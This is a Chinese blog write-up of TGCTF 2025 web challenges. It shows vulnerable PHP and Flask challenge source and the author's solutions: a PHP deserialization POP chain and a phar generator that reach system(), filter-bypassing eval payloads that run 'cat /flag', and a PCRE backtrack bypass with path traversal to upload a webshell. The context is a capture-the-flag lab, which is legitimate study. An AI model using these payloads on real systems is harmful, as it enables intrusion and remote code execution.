@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="TGCTF 2025 web(复现 日期：2025-06-01 21:16:23 前端GAME 前端game的三个阶段分别对应着三个cve CVE-2025-30208 【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客 CVE-2025-31486 复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486） CVE-2025-32395 复现与修">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TGCTF 2025 web(复现">
+<meta property="og:url" content="https://xendr1a.github.io/2025/06/01/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="TGCTF 2025 web(复现 日期：2025-06-01 21:16:23 前端GAME 前端game的三个阶段分别对应着三个cve CVE-2025-30208 【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客 CVE-2025-31486 复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486） CVE-2025-32395 复现与修">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId24.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId27.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId24.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId33.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId36.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId42.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId46.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId49.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId52.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId58.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId61.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId64.png">
+<meta property="article:published_time" content="2025-06-01T13:16:23.000Z">
+<meta property="article:modified_time" content="2026-06-11T11:13:16.461Z">
+<meta property="article:author" content="Xendr1a">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xendr1a.github.io/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId24.png">
+  
+  
+  
+  <title>TGCTF 2025 web(复现 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TGCTF 2025 web(复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-01 21:16" pubdate>
+          2025年6月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          103 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TGCTF 2025 web(复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>TGCTF 2025 web(复现</p>
+<p>日期：2025-06-01 21:16:23</p>
+<p>前端GAME</p>
+<p>前端game的三个阶段分别对应着三个cve</p>
+<p>CVE-2025-30208 【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客</p>
+<p>CVE-2025-31486 复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486）</p>
+<p>CVE-2025-32395 复现与修复指南：Vite再次bypass（CVE-2025-32395）</p>
+<p>什么文件上传？</p>
+<p>我们进入首页是一个文件上传的界面，按f12发现提示关键词机器人我们直接去看robots.txt</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId24.png" alt="rId24.png"></p>
+<p>我们进入&#x2F;class.php,</p>
+<p>&lt;?php    highlight_file(<strong>FILE</strong>);    error_reporting(0);    function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }    class yesterday {        public $learn;        public $study&#x3D;&quot;study&quot;;        public $try;        public function __construct()        {            $this-&gt;learn &#x3D; &quot;learn&lt;br&gt;&quot;;        }        public function __destruct()        {            echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;            return $this-&gt;study-&gt;hard();        }    }    class today {        public $doing;        public $did;        public $done;        public function __construct(){            $this-&gt;did &#x3D; &quot;What you did makes you outstanding.&lt;br&gt;&quot;;        }        public function __call($arg1, $arg2)        {            $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;            echo $this-&gt;done;            if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666){                return $this-&gt;doing();            }            else{                return $this-&gt;doing-&gt;better;            }        }    }    class tommoraw {        public $good;        public $bad;        public $soso;        public function __invoke(){            $this-&gt;good&#x3D;&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;            echo $this-&gt;good;        }        public function __get($arg1){            $this-&gt;bad&#x3D;&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;        }    }    class future{        private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;        private $out;        private $no;        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;        public function __set($arg1, $arg2) {            if ($this-&gt;out-&gt;useful7) {                echo &quot;Seven is my lucky number&lt;br&gt;&quot;;                system(&#39;whoami&#39;);            }        }        public function __toString(){            echo &quot;This is your future.&lt;br&gt;&quot;;            system($_POST[&quot;wow&quot;]);            return &quot;win&quot;;        }        public function __destruct(){            $this-&gt;no &#x3D; &quot;no&quot;;            return $this-&gt;no;        }    }    if (file_exists($_GET[&#39;filename&#39;])){        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;    }    else{        $data&#x3D;substr($_GET[&#39;filename&#39;],0,-4);        unserialize(best64_decode($data));    }    &#x2F;&#x2F; You learn yesterday, you choose today, can you get to your future??&gt;</p>
+<p>我们发现了这里，应该是我们要到达的地方，那我们如何调用__toString()方法呢</p>
+<p>public function __toString(){            echo &quot;This is your future.&lt;br&gt;&quot;;            system($_POST[&quot;wow&quot;]);            return &quot;win&quot;;        }</p>
+<p>然后注意到</p>
+<p>public function __call($arg1, $arg2)        {            $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;            echo $this-&gt;done;            if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666){                return $this-&gt;doing();            }            else{                return $this-&gt;doing-&gt;better;            }</p>
+<p>PHP在计算MD5哈希前会将对象转换为字符串，所以会自动调用 future类的__toString 方法那我们现在构造</p>
+<p>&lt;?phpclass yesterday {    public $study;}class today {    public $doing;}class future {}$future &#x3D; new future();$today &#x3D; new today();$today-&gt;doing &#x3D; $future;$yesterday &#x3D; new yesterday();$yesterday-&gt;study &#x3D; $today;echo serialize($yesterday);?&gt;O:9:&quot;yesterday&quot;:1:{s:5:&quot;study&quot;;O:5:&quot;today&quot;:1:{s:5:&quot;doing&quot;;O:6:&quot;future&quot;:0:{}}}</p>
+<p>然后看到</p>
+<p>function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }&#x2F;&#x2F;五次的decode,所以我们需要五次的encode</p>
+<p>和</p>
+<p>if (file_exists($_GET[&#39;filename&#39;])){        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;    }    else{        $data&#x3D;substr($_GET[&#39;filename&#39;],0,-4);        unserialize(best64_decode($data));    }&#x2F;&#x2F;我们需要在最后追加四个字符，加上aaaa</p>
+<p>我们得到Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NsWlVTbUZXUlRWUFZHMXpNVlpYU1hsaVIzQk9UVlZzTkZZeWRHOWpiVVpXVDBoa1VGSkdjRkJXYTJNMVkwWndSbGw2Vm1oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxUnRjekZXVjBsNVlrZEdVMlZ0ZUROWFZ6QjRZVzFHVms5SVpGQlNSbkJRV1Zjd05XTkdaSFJPVm1ST1VqRktXbFV5TVRSVGJVWjBUMVJPVlUxcVZYZFVNV1JoVjFVeFNGbDZNRDA9aaaa</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId27.png" alt="rId27.png"></p>
+<p>什么文件上传？（复仇）</p>
+<p>我们直接看到phar，又因为主页有个文件上传点，可以想到文件上传+phar反序列化</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId24.png" alt="rId24.png"></p>
+<p>我们先生成个phar.phar</p>
+<p>&lt;?phperror_reporting(0);class yesterday {    public $learn;    public $study&#x3D;&quot;study&quot;;    public $try;    public function __destruct()    {        &#x2F;&#x2F; echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;        return $this-&gt;study-&gt;hard();    }}class today {    public $doing;    public $did;    public $done;    public function __call($arg1, $arg2)    {        $this-&gt;done &#x3D; &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;        &#x2F;&#x2F; echo $this-&gt;done;        if(md5(md5($this-&gt;doing))&#x3D;&#x3D;666){            return $this-&gt;doing();        }        else{            return $this-&gt;doing-&gt;better;        }    }}class future{    private $impossible&#x3D;&quot;How can you get here?&lt;br&gt;&quot;;    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __toString(){        &#x2F;&#x2F; echo &quot;This is your future.&lt;br&gt;&quot;;        # system($_POST[&quot;wow&quot;]);        return &quot;win&quot;;    }}@unlink(&quot;phar.phar&quot;);$phar &#x3D; new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$a &#x3D; new yesterday();$b &#x3D; new today();$c &#x3D; new future();$a-&gt;study &#x3D; $b;$b-&gt;doing &#x3D; $c;$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</p>
+<p>生成了phar.phar，然后发现phar被过滤了，结合robots.txt的提示，我们爆破出后缀为atg</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId33.png" alt="rId33.png"></p>
+<p>我们读取环境变量，发现flag。</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId36.png" alt="rId36.png"></p>
+<p>AAA偷渡阴平</p>
+<p>&lt;?php$tgctf2025&#x3D;$_GET[&#39;tgctf2025&#39;];if(!preg_match(&quot;&#x2F;0|1|[3-9]|~|`|@|#|\$|%|^|&amp;amp;|*|\（|\）|-|=|+|{|[|]|}|:|&amp;#39;|&amp;quot;|,|&amp;lt;|.|&amp;gt;|/|?|\\&#x2F;i&quot;, $tgctf2025)){    &#x2F;&#x2F;hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die(&#39;(╯‵□′)╯炸弹！•••*～●&#39;);}highlight_file(<strong>FILE</strong>);</p>
+<p>过滤了好多东西，但是无参rce的函数没有过滤</p>
+<p>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;cmd&#x3D;system(&#39;cat &#x2F;f*&#39;);get_defined_vars()返回包含所有变量的数组（包括$_GET）current()取第一个元素（tgctf2025的值）end()取最后一个元素（b的值）eval()执行system(&#39;cat &#x2F;flag&#39;)命令</p>
+<p>AAA偷渡阴平（复仇）</p>
+<p>&lt;?php$tgctf2025&#x3D;$_GET[&#39;tgctf2025&#39;];if(!preg_match(&quot;&#x2F;0|1|[3-9]|~|`|@|#|\$|%|^|&amp;amp;|*|\（|\）|-|=|+|{|[|]|}|:|&amp;#39;|&amp;quot;|,|&amp;lt;|.|&amp;gt;|/|?|\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert&#x2F;i&quot;, $tgctf2025)){    &#x2F;&#x2F;hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die(&#39;(╯‵□′)╯炸弹！•••*～●&#39;);}highlight_file(<strong>FILE</strong>);</p>
+<p>我们可以看到过滤了一万个函数不会了看看wp，利用的是无参中的session</p>
+<p>?tgctf2025&#x3D;session_start();system(hex2bin(session_id()));PHPSESSID&#x3D;636174202f666c6167       &#x2F;&#x2F;cat &#x2F;flag</p>
+<p>(ez)upload</p>
+<p>我们扫到了index.php.bak和upload.php.bak</p>
+<p>&lt;?phpdefine(&#39;UPLOAD_PATH&#39;, <strong>DIR</strong> . &#39;&#x2F;uploads&#x2F;&#39;);$is_upload &#x3D; false;$msg &#x3D; null;$status_code &#x3D; 200; &#x2F;&#x2F; 默认状态码为 200if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext &#x3D; array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;php2&quot;, &quot;html&quot;, &quot;htm&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;);        if (isset($_GET[&#39;name&#39;])) {            $file_name &#x3D; $_GET[&#39;name&#39;];        } else {            $file_name &#x3D; basename($_FILES[&#39;name&#39;][&#39;name&#39;]);        }        $file_ext &#x3D; pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file &#x3D; $_FILES[&#39;name&#39;][&#39;tmp_name&#39;];            $file_content &#x3D; file_get_contents($temp_file);            if (preg_match(&#39;&#x2F;.+?&lt;&#x2F;s&#39;, $file_content)) {                $msg &#x3D; &#39;文件内容包含非法字符，禁止上传！&#39;;                $status_code &#x3D; 403; &#x2F;&#x2F; 403 表示禁止访问            } else {                $img_path &#x3D; UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload &#x3D; true;                    $msg &#x3D; &#39;文件上传成功！&#39;;                } else {                    $msg &#x3D; &#39;上传出错！&#39;;                    $status_code &#x3D; 500; &#x2F;&#x2F; 500 表示服务器内部错误                }            }        } else {            $msg &#x3D; &#39;禁止保存为该类型文件！&#39;;            $status_code &#x3D; 403; &#x2F;&#x2F; 403 表示禁止访问        }    } else {        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;        $status_code &#x3D; 404; &#x2F;&#x2F; 404 表示资源未找到    }}&#x2F;&#x2F; 设置 HTTP 状态码http_response_code($status_code);&#x2F;&#x2F; 输出结果echo json_encode([    &#39;status_code&#39; &#x3D;&gt; $status_code,    &#39;msg&#39; &#x3D;&gt; $msg,]);</p>
+<p>我们看到</p>
+<p>if (preg_match(&#39;&#x2F;.+?&lt;&#x2F;s&#39;, $file_content)) {                $msg &#x3D; &#39;文件内容包含非法字符，禁止上传！&#39;;                $status_code &#x3D; 403; &#x2F;&#x2F; 403 表示禁止访问            }</p>
+<p>是利用preg_match函数进行匹配的，我们可以利用PCRE回溯次数限制来绕过然后后面加上一句话木马</p>
+<p>101万左右的任意字符+然后name的话，通过传参name来进行目录穿越上传文件也就是..&#x2F;</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId42.png" alt="rId42.png"></p>
+<p>然后访问uploads&#x2F;1.php，flag在环境变量里面</p>
+<p>直面天命</p>
+<p>看到了hint</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId46.png" alt="rId46.png"></p>
+<p>hint：有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!爆破得到&#x2F;aazz</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId49.png" alt="rId49.png"></p>
+<p>爆破得到filename，试试有没有文件读取</p>
+<p><img src="/img/TGCTF-2025-web-%E5%A4%8D%E7%8E%B0/rId52.png" alt="rId52.png"></p>
+<p>抽象了，直接读到了flag</p>
+<p>直面天命（复仇）</p>
+<p>上面那个是非预期吧，然后我们接着这个读取继续做，我们读取&#x2F;app.py</p>
+<p>import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp &#x3D; Flask(<strong>name</strong>)black_list&#x3D;[&#39;{&#39;,&#39;}&#39;,&#39;popen&#39;,&#39;os&#39;,&#39;import&#39;,&#39;eval&#39;,&#39;<em>&#39;,&#39;system&#39;,&#39;read&#39;,&#39;base&#39;,&#39;globals&#39;]def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars &#x3D; string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in <a href="mailto:&#116;&#121;&#x70;&#97;&#x62;&#108;&#x65;&#x5f;&#99;&#104;&#x61;&#x72;&#x73;&#x40;&#x61;&#x70;&#x70;&#46;&#x72;&#x6f;&#x75;&#116;&#x65;">typable_chars@app.route</a>(&#39;&#x2F;&#39;)def home():    return send_from_directory(&#39;static&#39;, &#39;index.html&#39;)@app.route(&#39;&#x2F;jingu&#39;, methods&#x3D;[&#39;POST&#39;])def greet():    template1&#x3D;&quot;&quot;    template2&#x3D;&quot;&quot;    name &#x3D; request.form.get(&#39;name&#39;)    template &#x3D; f&#39;{name}&#39;    if waf(name):        template &#x3D; &#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&#39;    else:        k&#x3D;0        for i in name:            if is_typable(i):                continue            k&#x3D;1            break        if k&#x3D;&#x3D;1:            if not (secret_key[:2] in name and secret_key[2:]):                template &#x3D; &#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&#39;                return render_template_string(template)            template1 &#x3D; &quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;}}”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;            template&#x3D; template.replace(&quot;直面&quot;,&quot;&#123;&#123;&quot;).replace(&quot;天命&quot;,&quot;}}&quot;)            template &#x3D; template    if &quot;cat&quot; in template:        template2 &#x3D; &#39;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&#39;    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message &#x3D; f&quot;500报错了，查询语句如下：&lt;br&gt;{template}&quot;        return error_message, <a href="mailto:&#x34;&#48;&#x30;&#x40;&#x61;&#x70;&#112;&#46;&#114;&#111;&#117;&#x74;&#101;">400@app.route</a>(&#39;&#x2F;hint&#39;, methods&#x3D;[&#39;GET&#39;])def hinter():    template&#x3D;&quot;hint：&lt;br&gt;有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!&quot;    return render_template_string(template)@app.route(&#39;&#x2F;aazz&#39;, methods&#x3D;[&#39;GET&#39;])def finder():    filename &#x3D; request.args.get(&#39;filename&#39;, &#39;&#39;)    if filename &#x3D;&#x3D; &quot;&quot;:        return send_from_directory(&#39;static&#39;, &#39;file.html&#39;)    if not filename.replace(&#39;</em>&#39;, &#39;&#39;).isalnum():        content &#x3D; jsonify({&#39;error&#39;: &#39;只允许字母和数字！&#39;}), 400    if os.path.isfile(filename):        try:            with open(filename, &#39;r&#39;) as file:                content &#x3D; file.read()            return content        except Exception as e:            return jsonify({&#39;error&#39;: str(e)}), 500    else:        return jsonify({&#39;error&#39;: &#39;路径不存在或者路径非法&#39;}), 404if <strong>name</strong> &#x3D;&#x3D; &#39;<strong>main</strong>&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;80)</p>
+<p>看到了这个from a.b.c.d.secret import secret_key可以发现后面会将直面天命变成&#123;&#123;}}</p>
